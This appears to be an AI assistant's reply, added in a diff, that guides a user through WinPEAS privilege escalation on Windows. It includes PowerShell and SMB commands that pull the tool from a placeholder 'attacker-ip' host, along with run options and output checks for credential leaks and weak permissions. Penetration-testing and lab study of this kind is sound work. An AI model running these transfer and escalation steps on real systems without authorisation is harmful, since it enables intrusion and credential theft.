@@ -1,0 +1,120 @@
+Great! Let’s walk through using **WinPEAS**, a powerful tool for Windows privilege escalation. It’s usually used by penetration testers or CTF players to find misconfigurations or vulnerabilities that might allow privilege escalation on a Windows system.
+
+Here’s a **step-by-step guide** on how to use **WinPEAS**, including downloading, transferring, and executing it. I'll assume you have **user-level access** on a Windows machine (like through a reverse shell or RDP session) and that you’re operating in a lab environment or with **explicit authorization**.
+
+---
+
+## 🔹 Step 1: Download WinPEAS
+
+You can grab the latest WinPEAS from GitHub:
+
+```
+https://github.com/carlospolop/PEASS-ng/releases/latest
+```
+
+Choose one of these:
+
+* **winPEASx64.exe** (for 64-bit targets)
+* **winPEASx86.exe** (for 32-bit targets)
+
+---
+
+## 🔹 Step 2: Transfer WinPEAS to the Target
+
+You can transfer WinPEAS in several ways:
+
+* **Using SMB or file share**:
+
+  ```powershell
+  copy \\attacker-ip\share\winPEASx64.exe C:\Users\Public\
+  ```
+* **Using a download tool (PowerShell)**:
+
+  ```powershell
+  powershell -c "(new-object System.Net.WebClient).DownloadFile('http://attacker-ip/winPEASx64.exe', 'C:\Users\Public\winPEASx64.exe')"
+  ```
+* **Through a reverse shell** (like using Meterpreter’s `upload` command).
+
+---
+
+## 🔹 Step 3: Run WinPEAS
+
+1. **Navigate to where you placed WinPEAS**:
+
+   ```cmd
+   cd C:\Users\Public\
+   ```
+
+2. **Run WinPEAS with minimal arguments**:
+
+   ```cmd
+   winPEASx64.exe
+   ```
+
+Alternatively, you can redirect output to a file:
+
+```cmd
+winPEASx64.exe > output.txt
+```
+
+For **more detailed output**, use:
+
+```cmd
+winPEASx64.exe quiet
+```
+
+If you want to **disable color** (easier for copy-pasting):
+
+```cmd
+winPEASx64.exe nobanner noColor
+```
+
+**Full recommended command**:
+
+```cmd
+winPEASx64.exe quiet nobanner noColor > winpeas-output.txt
+```
+
+---
+
+## 🔹 Step 4: Analyze the Output
+
+Open `winpeas-output.txt` on your local machine and look for:
+
+* Misconfigured services
+* Unquoted service paths
+* Weak permissions on binaries
+* Registry issues
+* Credential leaks
+* Token privileges
+
+---
+
+## 🔹 Summary of Commands
+
+```bash
+# Download WinPEAS
+# (Download on your machine first)
+
+# Transfer WinPEAS to the target (Example using PowerShell)
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://attacker-ip/winPEASx64.exe', 'C:\Users\Public\winPEASx64.exe')"
+
+# Navigate to the file location
+cd C:\Users\Public\
+
+# Run WinPEAS
+winPEASx64.exe
+
+# Optional: Save output to file
+winPEASx64.exe quiet nobanner noColor > winpeas-output.txt
+```
+
+---
+
+## 🔹 Tips
+
+✅ Always verify **x64 or x86** architecture.
+✅ Use **noColor** if output parsing is tricky.
+✅ Always test on **legal environments** (like labs).
+
+Would you like me to help you interpret any WinPEAS results or provide tips on what to look for in the output? 🚀
